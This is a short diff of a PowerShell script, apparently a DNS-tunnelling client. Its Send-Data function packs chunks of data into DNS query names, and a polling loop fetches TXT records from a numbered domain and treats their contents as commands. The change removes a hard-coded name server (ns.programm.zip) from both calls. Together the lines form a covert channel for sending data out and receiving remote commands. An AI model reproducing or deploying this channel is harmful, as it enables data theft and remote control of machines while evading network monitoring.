@@ -20,7 +20,7 @@ function Send-Data {
         $dnsQuery = "$currentChunk.$query"
     
         # Send DNS query
-        $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip -ErrorAction Ignore
+        $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore
     
         if ($dnsResult) {
             # Never has a response ready, hopefully :-)
@@ -39,7 +39,7 @@ $commandcount = 0
 $stop = $false
 while (!$stop) {
     Write-Host "Request to: $commandcount.$code.$domain"
-    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Server ns.programm.zip -Type TXT -DnsOnly -ErrorAction Ignore
+    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -DnsOnly -ErrorAction Ignore
     if ($dnsResult) {
         try{
             $command = $dnsResult.Strings
